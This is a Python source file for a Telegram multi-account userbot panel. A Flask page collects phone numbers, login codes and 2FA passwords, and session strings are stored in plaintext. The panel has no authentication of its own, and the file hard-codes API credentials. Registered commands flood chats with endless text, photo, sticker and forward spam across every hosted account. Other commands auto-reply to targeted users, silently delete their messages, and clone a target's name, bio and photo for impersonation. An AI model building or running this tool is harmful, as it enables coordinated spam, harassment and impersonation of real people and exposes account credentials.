import asyncio
import os
import threading
import logging
from flask import Flask, render_template_string, request, redirect, url_for, flash
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.account import UpdateProfileRequest

app = Flask(__name__)
app.secret_key = "vivek_super_secret_key"

temp_logins = {}
active_tasks = {}
running_clients = {}

SUPEROWNER_ID = 6133172474
P = r"/"
current_delay = 1.0
SESSION_FILE = "sessions.txt"

# Tera diya hua naya custom API credentials
DEFAULT_API_ID = 30357864
DEFAULT_API_HASH = "8d8a1027816b1724b0b420480ea06a6f"

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("VIV1-WEB-PANEL")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vivek's Command Center</title>
    <style>
        body { background-color: #0b0f19; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #111827; padding: 30px; border-radius: 16px; width: 100%; max-width: 500px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); border: 1px solid #1f2937; }
        .brand { text-align: center; margin-bottom: 20px; }
        .brand h1 { color: #38bdf8; font-size: 22px; margin: 0; font-weight: 700; }
        .brand p { color: #94a3b8; font-size: 12px; margin-top: 5px; }
        label { display: block; margin-top: 12px; font-size: 13px; color: #cbd5e1; font-weight: 500; }
        input { width: 100%; padding: 10px; margin-top: 5px; border-radius: 8px; border: 1px solid #374151; background: #030712; color: white; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; background: #0284c7; color: white; padding: 10px; border: none; border-radius: 8px; font-weight: 600; margin-top: 18px; cursor: pointer; font-size: 14px; }
        button:hover { background: #0ea5e9; }
        .flash { background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; color: #fca5a5; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 13px; text-align: center; }
        .success { background: rgba(34, 197, 94, 0.15); border: 1px solid #22c55e; color: #86efac; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 13px; text-align: center; }
        .account-box { background: #1f2937; padding: 12px; border-radius: 8px; margin-top: 10px; border: 1px solid #374151; display: flex; justify-content: space-between; align-items: center; }
        .account-info { font-size: 13px; color: #e2e8f0; }
        .btn-danger { background: #ef4444; width: auto; padding: 6px 12px; margin: 0; font-size: 12px; }
        .btn-danger:hover { background: #dc2626; }
        .btn-success { background: #22c55e; width: auto; padding: 6px 12px; margin: 0; font-size: 12px; }
        .btn-success:hover { background: #16a34a; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #64748b; }
        hr { border: 0; border-top: 1px solid #1f2937; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="card">
        <div class="brand">
            <h1>⚡ Vivek's Command Center ⚡</h1>
            <p>Fast Multi-Account Host Suite</p>
        </div>
        
        {% with messages = get_flashed_messages(with_categories=true) %}
          {% if messages %}
            {% for cat, msg in messages %}
              <div class="{{ 'success' if cat == 'success' else 'flash' }}">{{ msg }}</div>
            {% endfor %}
          {% endif %}
        {% endwith %}
        
        {% if step == 'phone' %}
        <form method="POST" action="/send_code">
            <label>Phone Number (with +91):</label>
            <input type="text" name="phone" required placeholder="+91xxxxxxxxxx">
            <button type="submit">Send OTP Code</button>
        </form>
        
        <hr>
        <h3 style="font-size: 15px; color: #38bdf8; margin-bottom: 10px;">📱 Connected Accounts ({{ accounts|length }})</h3>
        {% if accounts %}
            {% for acc in accounts %}
            <div class="account-box">
                <div class="account-info">
                    <b>{{ acc.name }}</b><br>
                    <span style="color: #94a3b8; font-size: 11px;">ID: {{ acc.id }} | Status: {{ acc.status }}</span>
                </div>
                <div>
                    {% if acc.status == 'Offline' %}
                    <a href="/host/{{ loop.index0 }}"><button class="btn-success">Host</button></a>
                    {% endif %}
                    <a href="/delete/{{ loop.index0 }}"><button class="btn-danger">Delete</button></a>
                </div>
            </div>
            {% endfor %}
        {% else %}
            <p style="font-size: 12px; color: #64748b; text-align: center;">No accounts added yet.</p>
        {% endif %}

        {% elif step == 'otp' %}
        <form method="POST" action="/verify_otp">
            <label>Enter Telegram OTP Code:</label>
            <input type="text" name="otp" required placeholder="12345">
            <button type="submit">Verify OTP</button>
        </form>
        {% elif step == 'password' %}
        <form method="POST" action="/verify_password">
            <label>Enter 2FA Cloud Password:</label>
            <input type="password" name="password" required placeholder="Your 2FA password">
            <button type="submit">Complete Login</button>
        </form>
        {% endif %}
        <div class="footer">Automated by Vivek 🇧🇼</div>
    </div>
</body>
</html>
"""

def get_saved_accounts():
    accounts = []
    if not os.path.exists(SESSION_FILE):
        return accounts
    with open(SESSION_FILE, "r") as f:
        lines = f.readlines()
    for idx, line in enumerate(lines):
        parts = line.strip().split("|")
        if len(parts) == 3:
            api_id, api_hash, session_str = parts
            status = "Online" if session_str in running_clients else "Offline"
            name = running_clients.get(session_str, {}).get("name", f"Account {idx+1}")
            acc_id = running_clients.get(session_str, {}).get("id", "Unknown")
            accounts.append({"name": name, "id": acc_id, "status": status, "api_id": api_id, "api_hash": api_hash, "session": session_str})
    return accounts

@app.route("/")
def index():
    accounts = get_saved_accounts()
    return render_template_string(HTML_TEMPLATE, step="phone", accounts=accounts)

@app.route("/send_code", methods=["POST"])
def send_code():
    try:
        phone = request.form.get("phone").strip()
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), DEFAULT_API_ID, DEFAULT_API_HASH, loop=loop)
        loop.run_until_complete(client.connect())
        sent = loop.run_until_complete(client.send_code_request(phone))
        
        temp_logins["client"] = client
        temp_logins["phone"] = phone
        temp_logins["phone_code_hash"] = sent.phone_code_hash
        temp_logins["loop"] = loop
        
        return render_template_string(HTML_TEMPLATE, step="otp", accounts=[])
    except Exception as e:
        flash(f"Error: {str(e)}", "error")
        return redirect(url_for("index"))

@app.route("/verify_otp", methods=["POST"])
def verify_otp():
    otp = request.form.get("otp").strip()
    client = temp_logins.get("client")
    phone = temp_logins.get("phone")
    phone_code_hash = temp_logins.get("phone_code_hash")
    loop = temp_logins.get("loop")
    
    try:
        loop.run_until_complete(client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash))
        session_str = client.session.save()
        
        with open(SESSION_FILE, "a") as f:
            f.write(f"{DEFAULT_API_ID}|{DEFAULT_API_HASH}|{session_str}\n")
            
        asyncio.run_coroutine_threadsafe(start_single_client(DEFAULT_API_ID, DEFAULT_API_HASH, session_str), bot_loop)
        flash("Account connected successfully!", "success")
        return redirect(url_for("index"))
    except SessionPasswordNeededError:
        return render_template_string(HTML_TEMPLATE, step="password", accounts=[])
    except Exception as e:
        flash(f"Invalid OTP or Error: {str(e)}", "error")
        return redirect(url_for("index"))

@app.route("/verify_password", methods=["POST"])
def verify_password():
    password = request.form.get("password").strip()
    client = temp_logins.get("client")
    loop = temp_logins.get("loop")
    
    try:
        loop.run_until_complete(client.sign_in(password=password))
        session_str = client.session.save()
        
        with open(SESSION_FILE, "a") as f:
            f.write(f"{DEFAULT_API_ID}|{DEFAULT_API_HASH}|{session_str}\n")
            
        asyncio.run_coroutine_threadsafe(start_single_client(DEFAULT_API_ID, DEFAULT_API_HASH, session_str), bot_loop)
        flash("Account connected successfully!", "success")
        return redirect(url_for("index"))
    except Exception as e:
        flash(f"2FA Error: {str(e)}", "error")
        return redirect(url_for("index"))

@app.route("/delete/<int:index>")
def delete_account(index):
    if not os.path.exists(SESSION_FILE):
        return redirect(url_for("index"))
    with open(SESSION_FILE, "r") as f:
        lines = f.readlines()
    if 0 <= index < len(lines):
        parts = lines[index].strip().split("|")
        if len(parts) == 3:
            s_str = parts[2]
            if s_str in running_clients:
                try:
                    asyncio.run_coroutine_threadsafe(running_clients[s_str]["client"].disconnect(), bot_loop)
                    del running_clients[s_str]
                except Exception:
                    pass
        lines.pop(index)
        with open(SESSION_FILE, "w") as f:
            f.writelines(lines)
        flash("Account deleted successfully!", "success")
    return redirect(url_for("index"))

@app.route("/host/<int:index>")
def host_account(index):
    accounts = get_saved_accounts()
    if 0 <= index < len(accounts):
        acc = accounts[index]
        if acc["session"] not in running_clients:
            asyncio.run_coroutine_threadsafe(start_single_client(acc["api_id"], acc["api_hash"], acc["session"]), bot_loop)
            flash(f"Hosting started for {acc['name']}!", "success")
    return redirect(url_for("index"))

# ═══════════════ USERBOT COMMAND REGISTRATION ═══════════════

def register_userbot_events(client, client_id):
    
    @client.on(events.NewMessage(pattern=rf"{P}execute$"))
    async def execute_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        menu_text = (
            f"<i>author : V I V E K [Acc: {client_id}]</i>\n"
            "<code>────────────────────────</code>\n\n"
            "› <code>attack</code>\n"
            "› <code>swipe</code>\n"
            "› <code>spam</code>\n"
            "› <code>photospam</code>\n"
            "› <code>forwardspam</code>\n"
            "› <code>stickerspam</code>\n"
            "› <code>autoreply</code>\n"
            "› <code>mute</code>\n"
            "› <code>clone</code>\n"
            "› <code>reverse</code>\n"
            "› <code>invite</code>\n"
            "› <code>bio</code>\n"
            "› <code>dp</code>\n"
            "› <code>name</code>\n"
            "› <code>delay</code>\n"
            "› <code>ping</code>\n"
            "› <code>stop</code>\n\n"
            "<code>────────────────────────</code>\n"
            f"<i>author : V I V E K [Acc: {client_id}]</i>"
        )
        await event.edit(menu_text, parse_mode='html')

    @client.on(events.NewMessage(pattern=rf"{P}ping$"))
    async def ping_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        start = asyncio.get_event_loop().time()
        msg = await event.reply("⚡ Pinging...")
        end = asyncio.get_event_loop().time()
        await msg.edit(f"**🏓 Pong [{client_id}]!** `{(end - start) * 1000:.2f}ms`")

    @client.on(events.NewMessage(pattern=rf"{P}delay\s+(.+)"))
    async def delay_cmd(event):
        global current_delay
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        try:
            current_delay = float(event.pattern_match.group(1).strip())
            await event.reply(f"**⚡ Delay updated to:** `{current_delay}s`")
        except ValueError:
            await event.reply("**❌ Invalid number!**")

    @client.on(events.NewMessage(pattern=rf"{P}invite$"))
    async def invite_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        chat = await event.get_chat()
        await event.reply("🔄 Joining this chat with all active hosted accounts...")
        success_count = 0
        for s_str, data in running_clients.items():
            acc_client = data["client"]
            try:
                await acc_client(JoinChannelRequest(chat))
                success_count += 1
                await asyncio.sleep(1)
            except Exception as e:
                log.error(f"Join error: {e}")
        await event.reply(f"**✅ Successfully joined with `{success_count}` accounts!**")

    @client.on(events.NewMessage(pattern=rf"{P}bio\s+(.+)"))
    async def bio_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        new_bio = event.pattern_match.group(1).strip()
        await event.reply("🔄 Updating bio for all hosted accounts...")
        count = 0
        for s_str, data in running_clients.items():
            acc_client = data["client"]
            try:
                await acc_client(UpdateProfileRequest(about=new_bio))
                count += 1
                await asyncio.sleep(0.5)
            except Exception as e:
                log.error(f"Bio update error: {e}")
        await event.reply(f"**✅ Bio updated successfully for `{count}` accounts!**")

    @client.on(events.NewMessage(pattern=rf"{P}name\s+(.+)"))
    async def name_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        new_name = event.pattern_match.group(1).strip()
        await event.reply("🔄 Updating name for all hosted accounts...")
        count = 0
        for s_str, data in running_clients.items():
            acc_client = data["client"]
            try:
                await acc_client(UpdateProfileRequest(first_name=new_name, last_name=""))
                count += 1
                await asyncio.sleep(0.5)
            except Exception as e:
                log.error(f"Name update error: {e}")
        await event.reply(f"**✅ Name updated successfully for `{count}` accounts!**")

    @client.on(events.NewMessage(pattern=rf"{P}dp$"))
    async def dp_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        reply = await event.get_reply_message()
        if not reply or not reply.media:
            return await event.reply("**❌ Reply to a photo to set DP!**")
        
        await event.reply("🔄 Downloading photo and updating DP for all hosted accounts...")
        photo_path = await client.download_media(reply.media)
        
        count = 0
        for s_str, data in running_clients.items():
            acc_client = data["client"]
            try:
                file = await acc_client.upload_file(photo_path)
                await acc_client(UploadProfilePhotoRequest(file=file))
                count += 1
                await asyncio.sleep(1)
            except Exception as e:
                log.error(f"DP update error: {e}")
        
        if photo_path and os.path.exists(photo_path):
            os.remove(photo_path)
            
        await event.reply(f"**✅ Profile picture updated successfully for `{count}` accounts!**")

    @client.on(events.NewMessage(pattern=rf"{P}swipe(?:\s+(.+))?$"))
    async def swipe_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        reply = await event.get_reply_message()
        if not reply:
            return await event.reply("**❌ Reply to a message!**")
        text = event.pattern_match.group(1) or reply.text
        chat_id = event.chat_id
        await event.delete()

        task_key = (chat_id, client_id)
        if task_key in active_tasks:
            active_tasks[task_key].cancel()

        async def loop_swipe():
            try:
                while True:
                    await client.send_message(chat_id, text, reply_to=reply.id)
                    await asyncio.sleep(current_delay)
            except asyncio.CancelledError:
                pass
        active_tasks[task_key] = asyncio.create_task(loop_swipe())

    @client.on(events.NewMessage(pattern=rf"{P}spam\s+(.+)"))
    async def spam_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        text = event.pattern_match.group(1).strip()
        chat_id = event.chat_id
        await event.delete()

        task_key = (chat_id, client_id)
        if task_key in active_tasks:
            active_tasks[task_key].cancel()

        async def loop_spam():
            try:
                while True:
                    clients_list = [data["client"] for data in running_clients.values()]
                    if not clients_list:
                        clients_list = [client]
                    
                    for acc_client in clients_list:
                        try:
                            await acc_client.send_message(chat_id, text)
                        except Exception:
                            pass
                        await asyncio.sleep(current_delay)
            except asyncio.CancelledError:
                pass

        active_tasks[task_key] = asyncio.create_task(loop_spam())

    autoreply_storage = {}
    @client.on(events.NewMessage(pattern=rf"{P}autoreply\s+(.+)"))
    async def autoreply_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        reply = await event.get_reply_message()
        if not reply or not reply.sender_id:
            return await event.reply("**❌ Reply to target user!**")
        text = event.pattern_match.group(1)
        autoreply_storage.setdefault(event.chat_id, {})[reply.sender_id] = text
        await event.reply(f"**✅ Autoreply set for user ID:** `{reply.sender_id}`")

    @client.on(events.NewMessage(incoming=True))
    async def incoming_autoreply(event):
        if event.chat_id in autoreply_storage and event.sender_id in autoreply_storage[event.chat_id]:
            await event.reply(autoreply_storage[event.chat_id][event.sender_id])

    @client.on(events.NewMessage(pattern=rf"{P}photospam$"))
    async def photospam_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        reply = await event.get_reply_message()
        if not reply or not reply.media:
            return await event.reply("**❌ Reply to a photo!**")
        chat_id = event.chat_id
        await event.delete()
        
        task_key = (chat_id, client_id)
        async def loop_photo():
            try:
                while True:
                    await client.send_file(chat_id, reply.media)
                    await asyncio.sleep(current_delay)
            except asyncio.CancelledError:
                pass
        active_tasks[task_key] = asyncio.create_task(loop_photo())

    @client.on(events.NewMessage(pattern=rf"{P}forwardspam$"))
    async def forwardspam_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        reply = await event.get_reply_message()
        if not reply:
            return await event.reply("**❌ Reply to a message!**")
        chat_id = event.chat_id
        await event.delete()

        task_key = (chat_id, client_id)
        async def loop_fwd():
            try:
                while True:
                    await client.forward_messages(chat_id, reply)
                    await asyncio.sleep(current_delay)
            except asyncio.CancelledError:
                pass
        active_tasks[task_key] = asyncio.create_task(loop_fwd())

    @client.on(events.NewMessage(pattern=rf"{P}stickerspam$"))
    async def stickerspam_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        reply = await event.get_reply_message()
        if not reply or not reply.sticker:
            return await event.reply("**❌ Reply to a sticker!**")
        chat_id = event.chat_id
        await event.delete()

        task_key = (chat_id, client_id)
        async def loop_sticker():
            try:
                while True:
                    await client.send_file(chat_id, reply.sticker)
                    await asyncio.sleep(current_delay)
            except asyncio.CancelledError:
                pass
        active_tasks[task_key] = asyncio.create_task(loop_sticker())

    muted_users = set()
    @client.on(events.NewMessage(pattern=rf"{P}mute$"))
    async def mute_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        reply = await event.get_reply_message()
        if not reply or not reply.sender_id:
            return await event.reply("**❌ Reply to user!**")
        muted_users.add(reply.sender_id)
        await event.reply(f"**🔇 Muted user ID:** `{reply.sender_id}`")

    @client.on(events.NewMessage(incoming=True))
    async def mute_listener(event):
        if event.sender_id in muted_users:
            try:
                await event.delete()
            except Exception:
                pass

    original_profile = {}
    @client.on(events.NewMessage(pattern=rf"{P}clone$"))
    async def clone_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        reply = await event.get_reply_message()
        target = reply.sender_id if reply else None
        if not target:
            return await event.reply("**❌ Reply to target user!**")
        
        try:
            me = await client.get_me()
            my_full = await client(GetFullUserRequest(me.id))
            original_profile['first_name'] = me.first_name
            original_profile['last_name'] = me.last_name or ""
            original_profile['about'] = my_full.about or ""
            
            old_photos = await client.get_profile_photos('me', limit=1)
            original_profile['photo'] = await client.download_profile_photo(old_photos[0]) if old_photos else None

            user_full = await client(GetFullUserRequest(target))
            user_entity = await client.get_entity(target)
            
            await client(UpdateProfileRequest(first_name=user_entity.first_name, last_name=user_entity.last_name or "", about=user_full.about or ""))
            
            photo = await client.download_profile_photo(target)
            if photo:
                await client(UploadProfilePhotoRequest(file=await client.upload_file(photo)))
                os.remove(photo)
            await event.reply("**✨ Profile cloned successfully!**")
        except Exception as e:
            await event.reply(f"**❌ Error:** {str(e)}")

    @client.on(events.NewMessage(pattern=rf"{P}reverse$"))
    async def reverse_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        if not original_profile:
            return await event.reply("**❌ No backup found!**")
        try:
            await client(UpdateProfileRequest(first_name=original_profile['first_name'], last_name=original_profile['last_name'], about=original_profile['about']))
            if original_profile.get('photo') and os.path.exists(original_profile['photo']):
                await client(UploadProfilePhotoRequest(file=await client.upload_file(original_profile['photo'])))
            await event.reply("**✨ Profile restored successfully!**")
        except Exception as e:
            await event.reply(f"**❌ Error:** {str(e)}")

    @client.on(events.NewMessage(pattern=rf"{P}stop$"))
    async def stop_cmd(event):
        if event.sender_id != SUPEROWNER_ID and not event.out: return
        chat_id = event.chat_id
        count = 0
        for key in list(active_tasks.keys()):
            c_id, c_acc = key
            if c_id == chat_id and c_acc == client_id:
                active_tasks[key].cancel()
                del active_tasks[key]
                count += 1
        await event.reply(f"**🛑 Stopped `{count}` tasks for this account!**")

async def start_single_client(api_id, api_hash, session_str):
    try:
        client = TelegramClient(StringSession(session_str), int(api_id), int(api_hash) if str(api_hash).isdigit() else api_hash)
        await client.start()
        me = await client.get_me()
        running_clients[session_str] = {"client": client, "name": me.first_name, "id": me.id}
        register_userbot_events(client, me.id)
        log.info(f"✅ Userbot ready: {me.first_name} (ID: {me.id})")
        await client.run_until_disconnected()
    except Exception as e:
        log.error(f"Client error: {e}")

async def load_saved_sessions():
    if not os.path.exists(SESSION_FILE): return
    with open(SESSION_FILE, "r") as f:
        for line in f.readlines():
            parts = line.strip().split("|")
            if len(parts) == 3:
                asyncio.create_task(start_single_client(parts[0], parts[1], parts[2]))

bot_loop = None

def run_bot_loop():
    global bot_loop
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)
    bot_loop.run_until_complete(load_saved_sessions())
    bot_loop.run_forever()

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    run_bot_loop()
